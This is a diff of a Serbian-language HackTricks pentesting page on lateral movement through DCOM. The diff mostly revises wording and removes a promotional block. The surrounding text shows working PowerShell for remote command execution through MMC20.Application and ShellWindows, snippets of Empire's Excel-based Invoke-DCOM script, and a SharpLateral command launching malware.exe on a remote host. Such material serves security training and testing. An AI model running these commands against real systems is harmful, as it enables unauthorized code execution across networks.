@@ -15,23 +15,15 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## MMC20.Application
 
 **Za više informacija o ovoj tehnici pogledajte originalni post sa [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
 
-Distributed Component Object Model (DCOM) objekti predstavljaju zanimljivu mogućnost za interakcije zasnovane na mreži sa objektima. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Component Object Model (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Lista DCOM aplikacija može se dobiti korišćenjem PowerShell komande:
+Distributed Component Object Model (DCOM) objekti predstavljaju zanimljivu mogućnost za interakciju sa objektima putem mreže. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Component Object Model (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Lista DCOM aplikacija može se dobiti korišćenjem PowerShell komande:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-Objekat COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava skriptovanje operacija MMC dodataka. Značajno je da ovaj objekat sadrži metodu `ExecuteShellCommand` pod `Document.ActiveView`. Više informacija o ovoj metodi može se naći [ovde](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Proverite kako radi:
+The COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava skriptovanje operacija MMC dodataka. Značajno, ovaj objekat sadrži `ExecuteShellCommand` metodu pod `Document.ActiveView`. Više informacija o ovoj metodi može se naći [ovde](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Proverite kako radi:
 
 Ova funkcija olakšava izvršavanje komandi preko mreže putem DCOM aplikacije. Da biste se povezali sa DCOM-om na daljinu kao administrator, PowerShell se može koristiti na sledeći način:
 ```powershell
@@ -57,7 +49,7 @@ ls \\10.10.10.10\c$\Users
 
 **Za više informacija o ovoj tehnici pogledajte originalni post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
-Objekat **MMC20.Application** je identifikovan kao onaj koji nema eksplicitne "LaunchPermissions," podrazumevajući dozvole koje omogućavaju pristup Administratorima. Za dalje detalje, može se istražiti tema [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET za filtriranje objekata bez eksplicitne dozvole za pokretanje.
+Objekat **MMC20.Application** je identifikovan kao onaj koji nema eksplicitne "LaunchPermissions," podrazumevajući dozvole koje omogućavaju pristup Administratorima. Za dodatne detalje, može se istražiti tema [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET za filtriranje objekata bez eksplicitne dozvole za pokretanje.
 
 Dva specifična objekta, `ShellBrowserWindow` i `ShellWindows`, su istaknuta zbog nedostatka eksplicitnih dozvola za pokretanje. Odsustvo `LaunchPermission` registracione stavke pod `HKCR:\AppID\{guid}` označava da nema eksplicitnih dozvola.
 
@@ -75,7 +67,7 @@ $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\sy
 
 Lateral movement može se postići iskorišćavanjem DCOM Excel objekata. Za detaljne informacije, preporučuje se da pročitate diskusiju o korišćenju Excel DDE za lateralno kretanje putem DCOM na [Cybereasonovom blogu](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
 
-Empire projekat pruža PowerShell skriptu, koja demonstrira korišćenje Excela za daljinsko izvršavanje koda (RCE) manipulacijom DCOM objekata. Ispod su isječci iz skripte dostupne na [Empireovom GitHub repozitorijumu](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode zloupotrebe Excela za RCE:
+Empire projekat pruža PowerShell skriptu, koja demonstrira korišćenje Excela za daljinsko izvršavanje koda (RCE) manipulacijom DCOM objekata. Ispod su isječci iz skripte dostupne na [Empire-ovom GitHub repozitorijumu](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode zloupotrebe Excela za RCE:
 ```powershell
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
@@ -115,16 +107,10 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
-## References
+## Reference
 
 * [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 * [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
-
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -132,7 +118,7 @@ Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>Podržite HackTricks</summary>
+<summary>Podrška HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
